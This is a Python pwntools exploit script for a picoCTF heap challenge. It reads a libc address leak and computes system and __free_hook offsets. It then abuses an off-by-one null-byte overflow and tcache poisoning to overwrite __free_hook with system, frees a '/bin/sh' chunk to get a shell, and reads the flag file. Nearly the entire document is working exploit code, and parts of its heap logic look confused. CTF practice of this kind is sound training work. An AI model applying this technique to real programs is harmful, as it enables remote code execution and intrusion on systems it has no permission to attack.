#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

context.log_level = 'info'
context.arch = 'amd64'

p = remote(HOST, PORT)

# Dialog
p.recvuntil(b'So, you want to be a hero?')
p.sendline(b'y')

# Get leak and menu
data = p.recvuntil(b'>')
leak_line = data.split(b'Take this: ')[1].split(b'\n')[0]
leak = int(leak_line, 16)
log.info(f"Leak: 0x{leak:x}")

libc_base = leak - 0x21fd0
log.info(f"Libc base: 0x{libc_base:x}")

# Libc 2.29 addresses
system = libc_base + 0x4f4e0
free_hook = libc_base + 0x1e75a8
malloc_hook = libc_base + 0x1e4c30

log.info(f"system: 0x{system:x}")
log.info(f"__free_hook: 0x{free_hook:x}")

# The vulnerability: off-by-one null byte after each allocation
# buffer[size] = 0 after read(0, buffer, size)

# Strategy: Exploit tcache with the null byte overflow
# The null byte will overwrite metadata

# Allocate chunks of size that will trigger useful overflow
# Size 0xf8 will become 0x100 chunk, and null byte will overwrite next chunk's size

# Allocate 7 chunks (fill all slots)
sizes = [0xf8, 0xf8, 0xf8, 0xf8, 0xf8, 0xf8, 0x18]
for i, size in enumerate(sizes):
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(str(size).encode())
    p.recvuntil(b'description')
    p.sendline(b'A' * size)
    p.recvuntil(b'>')
    log.info(f"Allocated chunk {i} (size {size})")

# Free chunks to populate tcache
# Free in specific order to set up exploitation
for i in [6, 5, 4, 3, 2, 1]:
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(str(i).encode())
    p.recvuntil(b'>')
    log.info(f"Freed chunk {i}")

# Chunk 0 is still allocated
# Its null byte overflow can corrupt chunk 1's metadata

# Free chunk 0 to make room
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'0')
p.recvuntil(b'>')

# Reallocate with controlled data
# The null byte will corrupt the next chunk
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'248')  # 0xf8
p.recvuntil(b'description')

# Craft payload to abuse the null byte
# We want to corrupt tcache metadata
payload = p64(free_hook) * (0xf8 // 8)
p.send(payload)
p.recvuntil(b'>')

# Allocate more to consume tcache and get our poisoned chunk
for i in range(5):
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'248')
    p.recvuntil(b'description')
    p.sendline(b'B' * 248)
    p.recvuntil(b'>')
    log.info(f"Allocated filler {i}")

# Next allocation should give us control
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'8')
p.recvuntil(b'description')
p.send(p64(system))  # Overwrite __free_hook with system

log.info("Overwritten __free_hook")

# We're out of slots, need to free one
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'0')
p.recvuntil(b'>')

# Allocate chunk with "/bin/sh"
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'8')
p.recvuntil(b'description')
p.send(b'/bin/sh\x00')
p.recvuntil(b'>')

# Free it to trigger system("/bin/sh")
log.info("Triggering system")
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'0')

# Shell!
p.sendline(b'cat flag.txt')

try:
    flag = p.recvline_contains(b'picoCTF', timeout=2)
    log.success(f"FLAG: {flag.decode()}")
except:
    try:
        output = p.recvall(timeout=2)
        if b'picoCTF' in output:
            start = output.index(b'picoCTF')
            end = output.index(b'}', start) + 1
            log.success(f"FLAG: {output[start:end].decode()}")
        else:
            log.info("No flag found")
            p.interactive()
    except:
        p.interactive()

p.close()